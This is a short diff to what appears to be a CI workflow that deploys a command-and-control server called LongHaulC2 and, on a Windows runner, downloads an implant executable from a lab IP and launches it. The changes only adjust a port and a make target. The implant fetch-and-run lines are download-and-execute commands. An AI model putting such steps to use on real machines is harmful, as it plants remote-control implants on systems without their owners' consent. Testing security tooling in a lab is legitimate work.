@@ -26,7 +26,7 @@ jobs:
         echo "${{ secrets.SUDO_UBUNTU_RUNNER_PASSWORD }}" | sudo -S apt-get update -y
         echo "${{ secrets.SUDO_UBUNTU_RUNNER_PASSWORD }}" | sudo -S apt-get install -y make apache2
         echo "${{ secrets.SUDO_UBUNTU_RUNNER_PASSWORD }}" | sudo -S -E systemctl start apache2
-        echo "${{ secrets.SUDO_UBUNTU_RUNNER_PASSWORD }}" | sudo -S -E make deploy
+        echo "${{ secrets.SUDO_UBUNTU_RUNNER_PASSWORD }}" | sudo -S -E make redeploy
 
         echo "Successfully deployed LongHaulC2"
 
@@ -51,7 +51,7 @@ jobs:
     - name: Get & Run Implant
       run: |
         # Pull implant
-        Invoke-WebRequest http://10.0.1.170:8000/pytest_implant.exe -OutFile c:\pytest_implant.exe
+        Invoke-WebRequest http://10.0.1.170:80/pytest_implant.exe -OutFile c:\pytest_implant.exe
         # run implant
         Start-Process "C:\pytest_implant.exe"
 
